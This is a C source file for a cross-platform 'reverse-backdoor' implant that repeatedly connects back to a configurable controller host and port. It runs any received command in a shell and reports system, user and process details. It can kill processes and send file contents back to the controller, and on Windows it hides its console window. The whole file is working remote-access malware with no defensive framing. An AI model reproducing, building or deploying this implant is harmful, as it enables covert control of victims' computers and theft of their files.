/*
 * reverse-backdoor C-implant — cross-platform native agent
 * Supports: Windows (MinGW) and Linux (GCC)
 * Compiles to ~15KB stripped
 *
 * Build:
 *   Windows:  x86_64-w64-mingw32-gcc -O2 -s -o agent.exe agent.c -lws2_32
 *   Linux:    gcc -O2 -s -o agent agent.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <windows.h>
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <io.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET socket_t;
  typedef HANDLE thread_t;
  typedef CRITICAL_SECTION mutex_t;
  #define SLEEP_MS(ms) Sleep(ms)
  #define CLOSE_SOCK(s) closesocket(s)
  #define PIPE_OPEN _popen
  #define PIPE_CLOSE _pclose
  #define snprintf _snprintf
  #define strcasecmp _stricmp
  #define sock_err() WSAGetLastError()
#else
  #include <unistd.h>
  #include <pthread.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <sys/utsname.h>
  #include <dirent.h>
  #include <sys/stat.h>
  typedef int socket_t;
  typedef pthread_t thread_t;
  typedef pthread_mutex_t mutex_t;
  #define SLEEP_MS(ms) usleep((ms) * 1000)
  #define CLOSE_SOCK(s) close(s)
  #define PIPE_OPEN popen
  #define PIPE_CLOSE pclose
  #define sock_err() errno
#endif

/* ── CONFIG ─────────────────────────────────────────────── */
#define DEFAULT_HOST   "127.0.0.1"
#define DEFAULT_PORT   5555
#define RECONNECT_SEC  5
#define MAX_CMD_LEN    4096
#define MAX_RESP_LEN   65536
#define RECV_BUF_SIZE  8192

/* ── GLOBALS ────────────────────────────────────────────── */
static struct {
    char host[256];
    int  port;
    int  reconnect_sec;
    int  running;
    socket_t sock;
    mutex_t send_mutex;
    char recv_buf[RECV_BUF_SIZE * 4];
    int  recv_len;
} g = {
    .host = DEFAULT_HOST,
    .port = DEFAULT_PORT,
    .reconnect_sec = RECONNECT_SEC,
    .running = 1,
    .sock = -1,
};

/* ── UTILITY ────────────────────────────────────────────── */

static void log_debug(const char *fmt, ...) {
    (void)fmt;
}

static int json_escape(const char *src, char *dst, int max) {
    int i = 0, j = 0;
    while (src[i] && j < max - 3) {
        char c = src[i++];
        if (c == '"' || c == '\\') { dst[j++] = '\\'; dst[j++] = c; }
        else if (c == '\n') { dst[j++] = '\\'; dst[j++] = 'n'; }
        else if (c == '\r') { dst[j++] = '\\'; dst[j++] = 'r'; }
        else if (c == '\t') { dst[j++] = '\\'; dst[j++] = 't'; }
        else dst[j++] = c;
    }
    dst[j] = '\0';
    return j;
}

/* ── MUTEX ──────────────────────────────────────────────── */

static void mutex_init(mutex_t *m) {
#ifdef _WIN32
    InitializeCriticalSection(m);
#else
    pthread_mutex_init(m, NULL);
#endif
}

static void mutex_lock(mutex_t *m) {
#ifdef _WIN32
    EnterCriticalSection(m);
#else
    pthread_mutex_lock(m);
#endif
}

static void mutex_unlock(mutex_t *m) {
#ifdef _WIN32
    LeaveCriticalSection(m);
#else
    pthread_mutex_unlock(m);
#endif
}

/* ── SOCKET ─────────────────────────────────────────────── */

static int socket_init(void) {
#ifdef _WIN32
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
#else
    return 1;
#endif
}

static socket_t socket_connect(const char *host, int port) {
    struct addrinfo hints, *res;
    char port_str[16];
    socket_t s = -1;

    snprintf(port_str, sizeof(port_str), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;

    for (struct addrinfo *p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == -1) continue;
        if (connect(s, p->ai_addr, p->ai_addrlen) == 0) break;
        CLOSE_SOCK(s);
        s = -1;
    }
    freeaddrinfo(res);
    return s;
}

/* ── PROTOCOL ───────────────────────────────────────────── */

static int proto_send(socket_t s, const char *data) {
    int len = (int)strlen(data);
    mutex_lock(&g.send_mutex);
    int total = 0;
    while (total < len) {
#ifdef _WIN32
        int sent = send(s, data + total, len - total, 0);
#else
        int sent = (int)send(s, data + total, len - total, MSG_NOSIGNAL);
#endif
        if (sent <= 0) { mutex_unlock(&g.send_mutex); return 0; }
        total += sent;
    }
#ifdef _WIN32
    send(s, "\n", 1, 0);
#else
    send(s, "\n", 1, MSG_NOSIGNAL);
#endif
    mutex_unlock(&g.send_mutex);
    return 1;
}

static char *proto_recv(socket_t s) {
    while (1) {
        char *nl = memchr(g.recv_buf, '\n', g.recv_len);
        if (nl) {
            int msg_len = (int)(nl - g.recv_buf);
            *nl = '\0';
            char *msg = (char *)malloc(msg_len + 1);
            if (msg) {
                memcpy(msg, g.recv_buf, msg_len);
                msg[msg_len] = '\0';
            }
            g.recv_len -= (msg_len + 1);
            if (g.recv_len > 0)
                memmove(g.recv_buf, nl + 1, g.recv_len);
            return msg;
        }
        int space = (int)(sizeof(g.recv_buf) - g.recv_len - 1);
        if (space <= 0) return NULL;
        int n = recv(s, g.recv_buf + g.recv_len, space < RECV_BUF_SIZE ? space : RECV_BUF_SIZE, 0);
        if (n <= 0) return NULL;
        g.recv_len += n;
        g.recv_buf[g.recv_len] = '\0';
    }
}

/* ── COMMANDS ───────────────────────────────────────────── */

static char *format_json_response(const char *data);

static char *cmd_shell(const char *cmd) {
    char *raw = (char *)malloc(MAX_RESP_LEN);
    if (!raw) return NULL;
    raw[0] = '\0';

    FILE *fp = PIPE_OPEN(cmd, "r");
    if (!fp) {
        snprintf(raw, MAX_RESP_LEN, "[-] Command failed");
        char *result = format_json_response(raw);
        free(raw);
        return result;
    }
    int total = 0;
    while (total < MAX_RESP_LEN - 2 && !feof(fp)) {
        int n = (int)fread(raw + total, 1, MAX_RESP_LEN - total - 2, fp);
        if (n <= 0) break;
        total += n;
    }
    raw[total] = '\0';
    PIPE_CLOSE(fp);
    if (total == 0) snprintf(raw, MAX_RESP_LEN, "[+] Command executed (no output)");
    char *result = format_json_response(raw);
    free(raw);
    return result;
}

static char *cmd_ls(const char *path) {
    char buf[MAX_RESP_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf), "dir \"%s\" 2>&1", path && *path ? path : ".");
#else
    snprintf(buf, sizeof(buf), "ls -la \"%s\" 2>&1", path && *path ? path : ".");
#endif
    return cmd_shell(buf);
}

static char *cmd_sysinfo(void) {
    char buf[MAX_RESP_LEN];
    buf[0] = '\0';
#ifdef _WIN32
    char name[256];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size))
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "Node Name: %s\n", name);
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf),
        "Processor: %d cores\n", si.dwNumberOfProcessors);
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf),
            "Total RAM: %.1f GB\n", ms.ullTotalPhys / (1024.0*1024*1024));
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf),
        "Operating System: Windows\n");
#else
    struct utsname u;
    if (uname(&u) == 0)
        snprintf(buf, sizeof(buf),
            "Operating System: %s %s\nNode Name: %s\nMachine: %s\n",
            u.sysname, u.release, u.nodename, u.machine);
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf),
        "CPU Cores: %ld\n", cores > 0 ? cores : 1);
#endif
    return format_json_response(buf);
}

static char *format_json_response(const char *data) {
    char *escaped = (char *)malloc(MAX_RESP_LEN);
    char *result = (char *)malloc(MAX_RESP_LEN + 4);
    if (!escaped || !result) {
        free(escaped);
        free(result);
        return NULL;
    }
    json_escape(data, escaped, MAX_RESP_LEN);
    snprintf(result, MAX_RESP_LEN + 4, "\"%s\"", escaped);
    free(escaped);
    return result;
}

/* ── DISPATCH ───────────────────────────────────────────── */

static int dispatch(socket_t s, const char *json) {
    const char *cmd = json;

    if (!cmd || !*cmd) return 1;

    char *response = NULL;

    if (strcmp(cmd, "quit") == 0) {
        proto_send(s, "[+] Session terminated");
        return 0;
    }
    else if (strcmp(cmd, "background") == 0) {
        proto_send(s, "[+] Backgrounded");
    }
    else if (strcmp(cmd, "sysinfo") == 0) {
        response = cmd_sysinfo();
    }
    else if (strncmp(cmd, "ls", 2) == 0) {
        const char *path = cmd[2] == ' ' ? cmd + 3 : NULL;
        response = cmd_ls(path);
    }
    else if (strcmp(cmd, "pwd") == 0) {
        char cwd[1024];
#ifdef _WIN32
        if (_getcwd(cwd, sizeof(cwd))) response = format_json_response(cwd);
#else
        if (getcwd(cwd, sizeof(cwd))) response = format_json_response(cwd);
#endif
    }
    else if (strncmp(cmd, "cd ", 3) == 0) {
        const char *path = cmd + 3;
        while (*path == ' ') path++;
#ifdef _WIN32
        if (_chdir(path) == 0) {
#else
        if (chdir(path) == 0) {
#endif
            char cwd[1024];
#ifdef _WIN32
            _getcwd(cwd, sizeof(cwd));
#else
            getcwd(cwd, sizeof(cwd));
#endif
            char buf[MAX_RESP_LEN];
            snprintf(buf, sizeof(buf), "[+] Changed to: %s", cwd);
            response = format_json_response(buf);
        } else {
            response = format_json_response("[-] Directory not found");
        }
    }
    else if (strcmp(cmd, "check_admin") == 0) {
#ifdef _WIN32
        response = format_json_response("[-] Not admin");
#else
        response = format_json_response(geteuid() == 0 ? "[+] Root" : "[-] Not root");
#endif
    }
    else if (strcmp(cmd, "whoami") == 0) {
#ifdef _WIN32
        char user[256]; DWORD size = sizeof(user);
        if (GetUserNameA(user, &size))
            response = format_json_response(user);
        else
            response = format_json_response("unknown");
#else
        char *u = getenv("USER");
        response = format_json_response(u ? u : "unknown");
#endif
    }
    else if (strcmp(cmd, "ps") == 0) {
#ifdef _WIN32
        response = cmd_shell("tasklist 2>&1");
#else
        response = cmd_shell("ps aux 2>&1");
#endif
    }
    else if (strncmp(cmd, "kill ", 5) == 0) {
        char buf[512];
#ifdef _WIN32
        snprintf(buf, sizeof(buf), "taskkill /F /PID %s 2>&1", cmd + 5);
#else
        snprintf(buf, sizeof(buf), "kill -9 %s 2>&1", cmd + 5);
#endif
        response = cmd_shell(buf);
    }
    else if (strcmp(cmd, "ifconfig") == 0 || strcmp(cmd, "ip addr") == 0) {
#ifdef _WIN32
        response = cmd_shell("ipconfig 2>&1");
#else
        response = cmd_shell("ifconfig 2>&1");
#endif
    }
    else if (strncmp(cmd, "upload ", 7) == 0) {
        const char *fname = cmd + 7;
        while (*fname == ' ') fname++;
        char buf[MAX_RESP_LEN];
        snprintf(buf, sizeof(buf), "[-] Upload not supported in C-implant: %s", fname);
        response = format_json_response(buf);
    }
    else if (strncmp(cmd, "download ", 9) == 0) {
        const char *fname = cmd + 9;
        while (*fname == ' ') fname++;
        FILE *fp = fopen(fname, "rb");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            long sz = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            char *data = (char *)malloc(sz * 2 + 256);
            if (data) {
                size_t n = fread(data, 1, sz, fp);
                data[n] = '\0';
                proto_send(s, data);
                free(data);
            }
            fclose(fp);
            response = NULL;
        } else {
            response = format_json_response("[-] File not found");
        }
    }
    else {
        if (strcmp(cmd, "help") != 0 && strcmp(cmd, "clear") != 0) {
            response = cmd_shell(cmd);
        }
    }

    if (response) {
        proto_send(s, response);
        free(response);
    }
    return 1;
}

/* ── SESSION LOOP ───────────────────────────────────────── */

static int session_loop(socket_t s) {
    g.recv_len = 0;
    while (g.running) {
        char *cmd = proto_recv(s);
        if (!cmd) return 0;
        int keep = dispatch(s, cmd);
        free(cmd);
        if (!keep) return 0;
    }
    return 0;
}

static void run_agent(void) {
    while (g.running) {
        SLEEP_MS(g.reconnect_sec * 1000);
        g.sock = socket_connect(g.host, g.port);
        if (g.sock == -1) continue;

        session_loop(g.sock);
        CLOSE_SOCK(g.sock);
        g.sock = -1;
    }
}

/* ── MAIN ───────────────────────────────────────────────── */

int main(int argc, char **argv) {
    if (argc > 1) snprintf(g.host, sizeof(g.host), "%s", argv[1]);
    if (argc > 2) g.port = atoi(argv[2]);
    if (argc > 3) g.reconnect_sec = atoi(argv[3]);

    if (!socket_init()) return 1;
    mutex_init(&g.send_mutex);

#ifdef _WIN32
    /* Hide console window */
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
#endif

    run_agent();
    return 0;
}
